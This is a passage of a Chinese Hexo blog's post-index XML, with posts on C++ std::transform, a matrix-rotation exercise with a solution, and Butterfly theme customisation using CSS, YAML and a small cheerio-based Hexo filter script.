<span class="string">&quot;dqywy&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换前：&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"><span class="built_in">transform</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), str.<span class="built_in">begin</span>(), toupper);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换后：&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以定义一个新的字符串来接收，修改目标容器起始地址即可，但是字符串长度应该一致</span></span><br><span class="line">string str = <span class="string">&quot;dqywy&quot;</span>;</span><br><span class="line">string temp = <span class="string">&quot;dqywy99&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换前：&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"><span class="built_in">transform</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), temp.<span class="built_in">begin</span>(), toupper);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换后：&quot;</span> &lt;&lt; temp &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试返回值</span></span><br><span class="line"><span class="comment">// 过程分析：</span></span><br><span class="line"><span class="comment">// 1. 目标容器temp中的dqywy被修改为DQYWY，99未被覆盖，保持不变</span></span><br><span class="line"><span class="comment">// 2. transform返回temp存储DQYWY后的下一个位置的迭代器，即字符9的指针</span></span><br><span class="line">string str = <span class="string">&quot;dqywy&quot;</span>;</span><br><span class="line">string temp = <span class="string">&quot;dqywy99&quot;</span>;</span><br><span class="line">string::iterator p;<span class="comment">// 字符串迭代器</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换前：&quot;</span> &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">p = <span class="built_in">transform</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), temp.<span class="built_in">begin</span>(), toupper);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;转换后：&quot;</span> &lt;&lt; temp &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;transform返回值解引用：&quot;</span> &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 实用函数 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++实用函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二维动态数组实现矩阵旋转</title>
      <link href="/post/a4c4375c.html"/>
      <url>/post/a4c4375c.html</url>
      
        <content type="html"><![CDATA[<p>【问题描述】</p><p>　　旋转是图像处理的基本操作，在这个问题中，你需要将一个图像逆时针旋转90度。<br>　　计算机中的图像表示可以用一个矩阵来表示，为了旋转一个图像，只需要将对应的矩阵旋转即可。 </p><p>【输入形式】</p><p>　　输入的第一行包含两个整数n, m，分别表示图像矩阵的行数和列数。<br>　　接下来n行每行包含m个整数，表示输入的图像。 </p><p>【输出形式】</p><p>　　输出m行，每行包含n个整数，表示原始矩阵逆时针旋转90度后的矩阵。 </p><p>【样例输入】</p><p>　　2 3<br>　　1 5 3<br>　　3 2 4 </p><p>【样例输出】</p><p>　　3 4<br>　　5 2<br>　　1 3 </p><p>【评分标准】</p><p>　　<strong>评测用例规模与约定</strong><br>　　1 ≤ n, m ≤ 1,000，矩阵中的数都是不超过1000的非负整数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m, a;<span class="comment">// n行m列</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; temp;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; matrix;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">temp.<span class="built_in">push_back</span>(a);</span><br><span class="line">&#125;</span><br><span class="line">matrix.<span class="built_in">push_back</span>(temp);</span><br><span class="line">&#125;<span class="comment">// 将temp容器作为matrix容器的元素实现动态多维数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; --j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; matrix[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly实现一图流背景</title>
      <link href="/post/b34aef82.html"/>
      <url>/post/b34aef82.html</url>
      
        <content type="html"><![CDATA[<details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/23/p9TECkD.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>修改主题的配置文件 _config.butterfly.yml，将<code>index_img</code>和<code>footer_bg</code>的参数改为<code>transparent</code>，background设置为自己的图片地址</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Image (圖片設置)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The banner image of home page</span></span><br><span class="line"><span class="attr">index_img:</span> <span class="string">transparent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Beautify/Effect (美化/效果)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Website Background (設置網站背景)</span></span><br><span class="line"><span class="comment"># can set it to color or image (可設置圖片 或者 顔色)</span></span><br><span class="line"><span class="comment"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="attr">background:</span> <span class="string">url(https://example.com/img/background.jpg)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Footer Background</span></span><br><span class="line"><span class="attr">footer_bg:</span> <span class="string">transparent</span></span><br></pre></td></tr></table></figure><p>新建一个文件，位于 <code>source/css/modify.styl</code>，写入下列代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;nib&#x27;</span></span><br><span class="line"></span><br><span class="line">// 顶部图</span><br><span class="line">#page-header</span><br><span class="line">  &amp;, &amp;:before</span><br><span class="line">    <span class="attribute">background</span>: transparent !important</span><br><span class="line">  &amp;.post-bg, &amp;.not-home-page</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">280px</span> !important</span><br><span class="line">  #post-info</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">40px</span> !important</span><br><span class="line">  #page-site-info</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">140px</span> !important</span><br><span class="line"></span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>)</span><br><span class="line">    &amp;.not-home-page</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">200px</span> !important</span><br><span class="line">    #post-info</span><br><span class="line">      <span class="attribute">bottom</span>: <span class="number">10px</span> !important</span><br><span class="line">    #page-site-info</span><br><span class="line">      <span class="attribute">top</span>: <span class="number">100px</span> !important</span><br><span class="line"></span><br><span class="line">.top-img</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">250px</span></span><br><span class="line">  <span class="attribute">margin</span>: -<span class="number">50px</span> -<span class="number">40px</span> <span class="number">50px</span></span><br><span class="line">  <span class="attribute">border-top-left-radius</span>: inherit</span><br><span class="line">  <span class="attribute">border-top-right-radius</span>: inherit</span><br><span class="line">  <span class="attribute">background-position</span>: center center</span><br><span class="line">  <span class="attribute">background-size</span>: cover</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span></span><br><span class="line"></span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>)</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">230px</span></span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">36px</span> -<span class="number">14px</span> <span class="number">36px</span></span><br><span class="line"></span><br><span class="line">  [data-theme=<span class="string">&#x27;dark&#x27;</span>] &amp;</span><br><span class="line">    <span class="attribute">filter</span>: brightness(<span class="number">0.8</span>)</span><br><span class="line"></span><br><span class="line">// 页脚</span><br><span class="line">#<span class="attribute">footer</span>:before</span><br><span class="line">  <span class="attribute">background-color</span>: alpha(#FFF, .<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">  [data-theme=<span class="string">&#x27;dark&#x27;</span>] &amp;</span><br><span class="line">    <span class="attribute">background-color</span>: alpha(#<span class="number">000</span>, .<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">#footer-wrap, #footer-wrap a</span><br><span class="line">  <span class="attribute">color</span>: #<span class="number">111</span></span><br><span class="line">  <span class="attribute">transition</span>: unset</span><br><span class="line"></span><br><span class="line">  [data-theme=<span class="string">&#x27;dark&#x27;</span>] &amp;</span><br><span class="line">    <span class="attribute">color</span>: var(--light-grey)</span><br></pre></td></tr></table></figure><p>在主题配置文件 <code>_config.butterfly.yml</code> 的 <code>inject.head</code> 引入样式</p><p>注：<code>modify.styl</code> 会被 Hexo 渲染成 <code>modify.css</code> 文件，所以此处应为 <code>modify.css</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># other (其他)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Inject</span><br><span class="line"># Insert the code to head (before &#x27;<span class="tag">&lt;/<span class="name">head</span>&gt;</span>&#x27; tag) and the bottom (before &#x27;<span class="tag">&lt;/<span class="name">body</span>&gt;</span>&#x27; tag)</span><br><span class="line"># 插入代码到头部 <span class="tag">&lt;/<span class="name">head</span>&gt;</span> 之前 和 底部 <span class="tag">&lt;/<span class="name">body</span>&gt;</span> 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/modify.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在博客根目录打开cmd，安装依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install cheerio</span><br></pre></td></tr></table></figure><p>新建一个文件，位于 <code>scripts/modify.js</code>，并写入下列代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在页面插入新顶部图</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">cheerio.Root</span>&#125; $ Root</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">insertTopImg</span>(<span class="params">$</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> header = $(<span class="string">&#x27;#page-header&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (header.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> background = header.<span class="title function_">css</span>(<span class="string">&#x27;background-image&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!background) <span class="keyword">return</span>;</span><br><span class="line">    $(<span class="string">&#x27;#post, #page, #archive, #tag, #category&#x27;</span>).<span class="title function_">prepend</span>(<span class="string">`&lt;div class=&quot;top-img&quot; style=&quot;background-image: <span class="subst">$&#123;background&#125;</span>;&quot;&gt;&lt;/div&gt;`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&#x27;after_render:html&#x27;</span>, <span class="keyword">function</span>(<span class="params">str, data</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> $ = cheerio.<span class="title function_">load</span>(str, &#123;</span><br><span class="line">        <span class="attr">decodeEntities</span>: <span class="literal">false</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="title function_">insertTopImg</span>($);</span><br><span class="line">    <span class="keyword">return</span> $.<span class="title function_">html</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>hexo三连~</strong></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白天黑夜模式切换背景图</title>
      <link href="/post/9f3556f6.html"/>
      <url>/post/9f3556f6.html</url>
      
        <content type="html"><![CDATA[<details class="folding-tag" ><summary> 白天背景 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/23/p9TEPte.png" alt=""></p>              </div>            </details><details class="folding-tag" ><summary> 夜晚背景 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/23/p9TVMb6.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>打开主题配置文件<code>_config.butterfly.yml</code>，搜索<code>background</code>并定位到下列代码位置，对比代码修改</li></ol><p><code>ps</code>：注意删除加号并对齐</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Website Background (设置网站背景)</span></span><br><span class="line"><span class="comment"># can set it to color or image (可設置圖片 或者 顔色)</span></span><br><span class="line"><span class="comment"># The formal of image: url(http://xxxxxx.com/xxx.jpg)</span></span><br><span class="line"><span class="attr">background:</span> <span class="string">url(&lt;FilePath&gt;)</span></span><br><span class="line"><span class="string">+background_dark:</span> <span class="string">url(&lt;FilePath&gt;)</span></span><br></pre></td></tr></table></figure><ol><li>打开<code>Blog根目录/themes/butterfly/source/css/var.styl</code>，定位到36行左右(具体位置请对比下列代码)，对比下列代码增加一行</li></ol><p><code>ps</code>：注意删除加号并对齐</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$web</span>-bg = <span class="built_in">hexo-config</span>(<span class="string">&#x27;background&#x27;</span>) &amp;&amp; <span class="built_in">unquote</span>(<span class="built_in">hexo-config</span>(<span class="string">&#x27;background&#x27;</span>))</span><br><span class="line">+<span class="variable">$web</span>-bg-dark = <span class="built_in">hexo-config</span>(<span class="string">&#x27;background_dark&#x27;</span>) &amp;&amp; <span class="built_in">unquote</span>(<span class="built_in">hexo-config</span>(<span class="string">&#x27;background_dark&#x27;</span>))</span><br><span class="line"><span class="variable">$index_top_img_height</span> = <span class="built_in">hexo-config</span>(<span class="string">&#x27;index_top_img_height&#x27;</span>) ? <span class="built_in">convert</span>(<span class="built_in">hexo-config</span>(<span class="string">&#x27;index_top_img_height&#x27;</span>)) : <span class="number">100vh</span></span><br></pre></td></tr></table></figure><ol><li>打开Blog根目录/themes/butterfly/source/css/_mode/darkmode.styl，定位到41行左右(具体位置请对比下列代码)，对比下列代码修改</li></ol><p><code>ps</code>：注意删除加号和减号并将<code>#web_bg</code>对齐<code>#footer</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+   <span class="selector-id">#web_bg</span></span><br><span class="line">+     <span class="attribute">background</span>: <span class="variable">$web</span>-bg-dark</span><br><span class="line">-   <span class="selector-id">#web_bg</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">    <span class="selector-id">#footer</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">    <span class="selector-id">#page-header</span><span class="selector-pseudo">:before</span></span><br><span class="line">      <span class="attribute">position</span>: absolute</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span></span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100%</span></span><br><span class="line">      <span class="attribute">background-color</span>: <span class="built_in">alpha</span>(<span class="variable">$dark</span>-black, .<span class="number">7</span>)</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ol><li>hexo三连~</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly导航栏魔改</title>
      <link href="/post/728f2bce.html"/>
      <url>/post/728f2bce.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考自：<a href="https://blog.ffing.cn/hexo/hexo%E6%90%AD%E5%BB%BAbutterfly%E5%8D%9A%E5%AE%A2-%EF%BC%88%E4%BA%94%EF%BC%89%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%BE%8E%E5%8C%96">ffing导航栏美化</a></p><p><strong>注意：</strong></p><p><strong>1. 涉及修改的文件代码请一定做好备份！！！</strong></p><p><strong>2. 如果在做完本教程后发现一些特效消失了，一般都是因为main.js重做导致的，请找到该特效的教程并对main.js进行修改</strong></p><p><strong>3. 修改完以后移动端偶尔会出bug，如下图（暂未找到解决方案，但是概率很小，平时都可以正常使用）</strong></p><details class="folding-tag" ><summary> 移动端bug </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/22/p9osKwq.png" alt=""></p>              </div>            </details><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/22/p9oDT58.png" alt=""></p>              </div>            </details><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-打开Blog根目录-source-css-custom-css，路径中缺少的文件夹或文件直接创建即可，添加下列代码"><a href="#1-打开Blog根目录-source-css-custom-css，路径中缺少的文件夹或文件直接创建即可，添加下列代码" class="headerlink" title="1. 打开Blog根目录/source/css/custom.css，路径中缺少的文件夹或文件直接创建即可，添加下列代码"></a>1. 打开<code>Blog根目录/source/css/custom.css</code>，路径中缺少的文件夹或文件直接创建即可，添加下列代码</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span 